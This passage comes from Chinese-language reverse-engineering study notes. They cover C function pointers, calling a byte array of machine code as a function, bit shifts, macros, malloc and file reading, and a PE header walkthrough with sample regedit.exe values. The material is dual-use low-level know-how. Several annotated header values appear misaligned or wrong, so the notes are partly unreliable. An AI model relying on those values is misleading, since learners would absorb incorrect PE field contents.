class=\"line\">int Function(int x, int y)</span><br><span class=\"line\">&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int (*pFun)(int,int);</span><br><span class=\"line\">pFun = Function;</span><br><span class=\"line\">int x= pFun(1,2);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230130145723603.png\" alt=\"image-20230130145723603\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int Func(int x,int y)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn x*y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D770 55                   push        ebp</span><br><span class=\"line\">0040D771 8B EC                mov         ebp,esp</span><br><span class=\"line\">0040D773 83 EC 40             sub         esp,40h</span><br><span class=\"line\">0040D776 53                   push        ebx</span><br><span class=\"line\">0040D777 56                   push        esi</span><br><span class=\"line\">0040D778 57                   push        edi</span><br><span class=\"line\">0040D779 8D 7D C0             lea         edi,[ebp-40h]</span><br><span class=\"line\">0040D77C B9 10 00 00 00       mov         ecx,10h</span><br><span class=\"line\">0040D781 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class=\"line\">0040D786 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\">0040D788 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class=\"line\">0040D78B 0F AF 45 0C          imul        eax,dword ptr [ebp+0Ch]</span><br><span class=\"line\">0040D78F 5F                   pop         edi</span><br><span class=\"line\">0040D790 5E                   pop         esi</span><br><span class=\"line\">0040D791 5B                   pop         ebx</span><br><span class=\"line\">0040D792 8B E5                mov         esp,ebp</span><br><span class=\"line\">0040D794 5D                   pop         ebp</span><br><span class=\"line\">0040D795 C3                   ret</span><br><span class=\"line\">55</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char Func[] = &#123;</span><br><span class=\"line\">\t0x55,              </span><br><span class=\"line\">    0x8B, 0xEC,           </span><br><span class=\"line\">    0x83, 0xEC, 0x40,        </span><br><span class=\"line\">    0x53,              </span><br><span class=\"line\">    0x56,              </span><br><span class=\"line\">    0x57,              </span><br><span class=\"line\">    0x8D, 0x7D, 0xC0,        </span><br><span class=\"line\">    0xB9, 0x10, 0x00, 0x00, 0x00,  </span><br><span class=\"line\">    0xB8, 0xCC, 0xCC, 0xCC, 0xCC,  </span><br><span class=\"line\">    0xF3, 0xAB,    </span><br><span class=\"line\">    0x8B, 0x45, 0x08,     </span><br><span class=\"line\">    0x0F, 0xAF, 0x45, 0x0C,</span><br><span class=\"line\">    0x5F,              </span><br><span class=\"line\">    0x5E,              </span><br><span class=\"line\">    0x5B,              </span><br><span class=\"line\">    0x8B, 0xE5,           </span><br><span class=\"line\">    0x5D,              </span><br><span class=\"line\">    0xC3              </span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint (*p)(int,int);</span><br><span class=\"line\">\tp = (int (*)(int,int))&amp;Func;</span><br><span class=\"line\">\tint x = p(3,4);</span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,x);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"位运算\"><a class=\"markdownIt-Anchor\" href=\"#位运算\">#</a> 位运算</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">算术移位</span><br><span class=\"line\">SAL/SAR Reg/Mem,CL/Imm</span><br><span class=\"line\"></span><br><span class=\"line\">SAL:算术左移，补0</span><br><span class=\"line\">SAR:算术右移，补符号位</span><br><span class=\"line\"></span><br><span class=\"line\">逻辑位移</span><br><span class=\"line\">SHL 补0</span><br><span class=\"line\">SHR 补0</span><br><span class=\"line\"></span><br><span class=\"line\">循环位移 </span><br><span class=\"line\">ROL</span><br><span class=\"line\">ROR</span><br><span class=\"line\"></span><br><span class=\"line\">带进位的循环移位指令</span><br><span class=\"line\">RCL</span><br><span class=\"line\">RCR</span><br><span class=\"line\"></span><br><span class=\"line\">2&amp;3 = 2</span><br><span class=\"line\">2|3 = 3</span><br><span class=\"line\">~2 = fd</span><br><span class=\"line\">2^3 = 1</span><br><span class=\"line\"></span><br><span class=\"line\">int x</span><br><span class=\"line\">x &gt;&gt; rol</span><br><span class=\"line\">x &lt;&lt; shr</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"define\"><a class=\"markdownIt-Anchor\" href=\"#define\">#</a> define</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">替换</span><br><span class=\"line\">编译</span><br><span class=\"line\">连接</span><br><span class=\"line\"></span><br><span class=\"line\">typedef只能给类型起别名</span><br><span class=\"line\">define可以给任何起别名</span><br><span class=\"line\"></span><br><span class=\"line\">define定义的变量不在常量区，在替换的环节直接替换为</span><br><span class=\"line\"></span><br><span class=\"line\">#define PI 3.14   //无参数宏</span><br><span class=\"line\">#define MAX(A,B) ((A)&gt;(B)?(A):(B))     //无堆栈调用</span><br><span class=\"line\">#define \\ 定义多行</span><br><span class=\"line\"></span><br><span class=\"line\">//避免重复包含</span><br><span class=\"line\">#if !define(ZZZ)</span><br><span class=\"line\">#define ZZZ </span><br><span class=\"line\">...</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//stdafx.h</span><br><span class=\"line\"></span><br><span class=\"line\">#if !defined(AFX_STDAFX_H__7058845C_68A9_4312_A9CE_A08FAB5CE1F2__INCLUDED_)</span><br><span class=\"line\">#define AFX_STDAFX_H__7058845C_68A9_4312_A9CE_A08FAB5CE1F2__INCLUDED_</span><br><span class=\"line\"></span><br><span class=\"line\">#if _MSC_VER &gt; 1000</span><br><span class=\"line\">#pragma once     //pragma对编译器兼容不好，如果版本&gt;1000才使用pragma once ,否则就使用上面的方法</span><br><span class=\"line\">#endif // _MSC_VER &gt; 1000</span><br><span class=\"line\"></span><br><span class=\"line\">#define WIN32_LEAN_AND_MEAN\t\t// Exclude rarely-used stuff from Windows headers</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"malloc\"><a class=\"markdownIt-Anchor\" href=\"#malloc\">#</a> malloc</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span> 先到当前目录，&lt;&gt;先到安装目录</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span>* ptr;</span><br><span class=\"line\">ptr = (<span class=\"type\">int</span>*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>)*<span class=\"number\">128</span>); <span class=\"comment\">//void* malloc(size_t size)   void*类型不确定，用的时候强转</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (ptr == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;        <span class=\"comment\">//无法分配内存的时候返回NULL</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(ptr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>)*<span class=\"number\">128</span>);    <span class=\"comment\">//初始化分配的内存空间</span></span><br><span class=\"line\">*(ptr) = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">free</span>(ptr);   <span class=\"comment\">//释放堆空间</span></span><br><span class=\"line\">ptr = <span class=\"literal\">NULL</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fopen</span><br><span class=\"line\">fseek  设置文件指针</span><br><span class=\"line\">ftell  文件大小</span><br><span class=\"line\">fclose</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201143200063.png\" alt=\"image-20230201143200063\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &quot;stdlib.h&quot;</span><br><span class=\"line\">#include &quot;malloc.h&quot;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFILE *fp = NULL;</span><br><span class=\"line\">\tfp = fopen(&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;,&quot;rb&quot;);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif(fp == NULL) return -1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfseek(fp,0,SEEK_END);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint len = ftell(fp);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t//printf(&quot;%d\\n&quot;,len);</span><br><span class=\"line\">\tchar* ptr;</span><br><span class=\"line\">\tptr = (char*)malloc(len);</span><br><span class=\"line\">\tif(ptr == NULL) return -1;</span><br><span class=\"line\">\tmemset(ptr,0,len);</span><br><span class=\"line\"></span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\twhile(1)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tc = fgetc(fp);</span><br><span class=\"line\">\t\tif(feof(fp)) break;</span><br><span class=\"line\">\t\tprintf(&quot;%c&quot;, c);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%X\\n&quot;,ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfree(ptr);</span><br><span class=\"line\">\tptr = NULL;</span><br><span class=\"line\">\tfclose(fp);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5ODA1NDc3P3R5cGU9YmxvZw==\">Revival_S_滴水逆向三期，C 语言入门，数据结构 - CSDN 博客</span></p>\n<h2 id=\"pe\"><a class=\"markdownIt-Anchor\" href=\"#pe\">#</a> PE</h2>\n<h3 id=\"pe结构\"><a class=\"markdownIt-Anchor\" href=\"#pe结构\">#</a> PE 结构</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sys dll exe 4D5A开头 MZ的ASCII</span><br><span class=\"line\"></span><br><span class=\"line\">PE结构是分节的</span><br><span class=\"line\">1.节省硬盘空间，内存中的空隙会更大(任何exe都有自己的4G空间，2G程序，2G操作系统，通过指针访问低2G,通过驱动访问高2G)</span><br><span class=\"line\">2.对齐：早期程序硬盘对齐200H，内存对齐1000H.现在大部分都是1000H字节对齐，增加读写速度</span><br><span class=\"line\">3.节省内存，不在复制全部节</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203140027163.png\" alt=\"image-20230203140027163\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DOS头</span><br><span class=\"line\">WORD e_magic    MZ判断是否是可执行文件</span><br><span class=\"line\">DWORD e_lfanew  从文件开始算，偏移e_lfanew个字节就是PE文件开始 </span><br><span class=\"line\"></span><br><span class=\"line\">NT头</span><br><span class=\"line\">Machine</span><br><span class=\"line\">NumberOfSections</span><br><span class=\"line\">TimeDateStamp</span><br><span class=\"line\">SizeOfOptionalHeader</span><br><span class=\"line\">Characteristics</span><br><span class=\"line\"></span><br><span class=\"line\">可选PE头</span><br><span class=\"line\">Magic</span><br><span class=\"line\">SizeOfCode</span><br><span class=\"line\">SizeOfInitializedData</span><br><span class=\"line\">SizeOfUnInitializedData</span><br><span class=\"line\">AddressOfEntryPoint</span><br><span class=\"line\">BaseOfCode</span><br><span class=\"line\">BaseOfData</span><br><span class=\"line\">ImageBase</span><br><span class=\"line\">SectionAlignment;</span><br><span class=\"line\">FileAlignment</span><br><span class=\"line\">SizeOfImage</span><br><span class=\"line\">SizeOfHeaders</span><br><span class=\"line\">CheckSum</span><br><span class=\"line\">SizeOfStackReverse</span><br><span class=\"line\">SizeOfStackCommit</span><br><span class=\"line\">SizeOfHeapReverse</span><br><span class=\"line\">SizeOfHeapCommit</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//x64 regedit.exe</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_DOS_HEADER</span> &#123;</span>      <span class=\"comment\">// DOS .EXE header</span></span><br><span class=\"line\">    WORD   e_magic;  <span class=\"number\">5</span>A4D                     <span class=\"comment\">// Magic number MZ标记用于判断是否是可执行文件\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">    WORD   e_cblp;   <span class=\"number\">0090</span>                   <span class=\"comment\">// Bytes on last page of file</span></span><br><span class=\"line\">    WORD   e_cp;     <span class=\"number\">0003</span>                   <span class=\"comment\">// Pages in file</span></span><br><span class=\"line\">    WORD   e_crlc;   <span class=\"number\">0000</span>                   <span class=\"comment\">// Relocations</span></span><br><span class=\"line\">    WORD   e_cparhdr;   <span class=\"number\">0004</span>                <span class=\"comment\">// Size of header in paragraphs</span></span><br><span class=\"line\">    WORD   e_minalloc;  <span class=\"number\">0000</span>                <span class=\"comment\">// Minimum extra paragraphs needed</span></span><br><span class=\"line\">    WORD   e_maxalloc;  FFFF                <span class=\"comment\">// Maximum extra paragraphs needed</span></span><br><span class=\"line\">    WORD   e_ss;  <span class=\"number\">0000</span>                      <span class=\"comment\">// Initial (relative) SS value</span></span><br><span class=\"line\">    WORD   e_sp;  <span class=\"number\">00B</span>8                      <span class=\"comment\">// Initial SP value</span></span><br><span class=\"line\">    WORD   e_csum;  <span class=\"number\">0000</span>                     <span class=\"comment\">// Checksum</span></span><br><span class=\"line\">    WORD   e_ip;    <span class=\"number\">0000</span>                     <span class=\"comment\">// Initial IP value</span></span><br><span class=\"line\">    WORD   e_cs;    <span class=\"number\">0000</span>                    <span class=\"comment\">// Initial (relative) CS value</span></span><br><span class=\"line\">    WORD   e_lfarlc;     <span class=\"number\">0040</span>                <span class=\"comment\">// File address of relocation table</span></span><br><span class=\"line\">    WORD   e_ovno;       <span class=\"number\">0000</span>               <span class=\"comment\">// Overlay number</span></span><br><span class=\"line\">    WORD   e_res[<span class=\"number\">4</span>];     <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>               <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    WORD   e_oemid;      <span class=\"number\">0000</span>               <span class=\"comment\">// OEM identifier (for e_oeminfo)</span></span><br><span class=\"line\">    WORD   e_oeminfo;    <span class=\"number\">0000</span>               <span class=\"comment\">// OEM information; e_oemid specific</span></span><br><span class=\"line\">    WORD   e_res2[<span class=\"number\">10</span>];   <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span> <span class=\"number\">0000</span>               <span class=\"comment\">// Reserved words</span></span><br><span class=\"line\">    DWORD  e_lfanew;     <span class=\"number\">0000</span> <span class=\"number\">00F</span>8               <span class=\"comment\">// File address of new exe header PE头相对于文件的偏移，定位PE文件</span></span><br><span class=\"line\">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class=\"line\"><span class=\"comment\">//0x40</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class=\"line\">    DWORD Signature;    <span class=\"number\">00004550</span></span><br><span class=\"line\">    IMAGE_FILE_HEADER FileHeader;</span><br><span class=\"line\">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class=\"line\">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class=\"line\"><span class=\"comment\">//E0+14+4=0xF8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD    Machine;        <span class=\"number\">8664</span>   <span class=\"comment\">//程序运行的CPU型号，0x0任何处理器，0x14C 386及后续处理器</span></span><br><span class=\"line\">    WORD    NumberOfSections;    <span class=\"number\">0007</span>   <span class=\"comment\">//文件中节的总数，要新增或者合并节，修改值</span></span><br><span class=\"line\">    DWORD   TimeDateStamp;     AC6AAA87   <span class=\"comment\">//时间戳：文件创建时间，编译器填写，可以用于判断map文件生成时间</span></span><br><span class=\"line\">    DWORD   PointerToSymbolTable; <span class=\"number\">00000000</span>  </span><br><span class=\"line\">    DWORD   NumberOfSymbols;   <span class=\"number\">00000000</span></span><br><span class=\"line\">    WORD    SizeOfOptionalHeader;   <span class=\"number\">00F</span>0   <span class=\"comment\">//可选PE头大小，32位默认E0H，64位默认F0，大小可以自定义</span></span><br><span class=\"line\">    WORD    Characteristics;     <span class=\"number\">0022</span>      <span class=\"comment\">//可执行文件为10F，每位有不同含义</span></span><br><span class=\"line\">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class=\"line\"><span class=\"comment\">//0x14</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class=\"line\">    WORD    Magic;\t\t <span class=\"number\">020B</span>     <span class=\"comment\">//10B 32位下PE   20B 64位下pe</span></span><br><span class=\"line\">    BYTE    MajorLinkerVersion; <span class=\"number\">0</span>E</span><br><span class=\"line\">    BYTE    MinorLinkerVersion; <span class=\"number\">14</span></span><br><span class=\"line\">    DWORD   SizeOfCode;  <span class=\"number\">00023400</span>     <span class=\"comment\">//所有 节的和，必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   SizeOfInitializedData;  <span class=\"number\">00079400</span>    <span class=\"comment\">//已初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   SizeOfUninitializedData; <span class=\"number\">00000000</span>   <span class=\"comment\">//未初始化数据大小的和必须是FileAlignment的整数倍，编译器填的没用</span></span><br><span class=\"line\">    DWORD   AddressOfEntryPoint;   <span class=\"number\">00023520</span>     <span class=\"comment\">//程序入口，但在内存中真正的入口在imagebase+OEP,一个exe中包含多个pe文件，且exe有独立空间</span></span><br><span class=\"line\">    DWORD   BaseOfCode;\t\t\t<span class=\"number\">00001000</span>\t\t<span class=\"comment\">//代码开始的基址</span></span><br><span class=\"line\">    DWORD   BaseOfData;\t\t\t<span class=\"number\">40000000</span>\t\t<span class=\"comment\">//数据开始的基址</span></span><br><span class=\"line\">    DWORD   ImageBase;\t\t\t<span class=\"number\">00000100</span>\t\t<span class=\"comment\">//内存镜像地址，内存中数据是哪里开始的</span></span><br><span class=\"line\">    DWORD   SectionAlignment;\t<span class=\"number\">00001000</span>        <span class=\"comment\">//内存对齐</span></span><br><span class=\"line\">    DWORD   FileAlignment;\t\t<span class=\"number\">00000002</span>        <span class=\"comment\">//文件对齐</span></span><br><span class=\"line\">    WORD    MajorOperatingSystemVersion;\t<span class=\"number\">000</span>A\t\t</span><br><span class=\"line\">    WORD    MinorOperatingSystemVersion;    <span class=\"number\">0000</span></span><br><span class=\"line\">    WORD    MajorImageVersion;\t\t\t\t<span class=\"number\">000</span>A</span><br><span class=\"line\">    WORD    MinorImageVersion;\t\t\t\t<span class=\"number\">0000</span></span><br><span class=\"line\">    WORD    MajorSubsystemVersion;\t\t\t<span class=\"number\">000</span>A</span><br><span class=\"line\">    WORD    MinorSubsystemVersion;\t\t\t<span class=\"number\">0000</span></span><br><span class=\"line\">    DWORD   Win32VersionValue;\t\t\t\t<span class=\"number\">00000000</span></span><br><span class=\"line\">    DWORD   SizeOfImage;\t\t\t\t\t<span class=\"number\">000</span>A2000    <span class=\"comment\">//内存中整个PE文件的映射的尺寸，必须是FileAlignment的整数倍</span></span><br><span class=\"line\">    DWORD   SizeOfHeaders;\t\t\t\t\t<span class=\"number\">00000400</span>    <span class=\"comment\">//所有头+节表按照文件对齐后的大小</span></span><br><span class=\"line\">    DWORD   CheckSum;\t\t\t\t\t\t<span 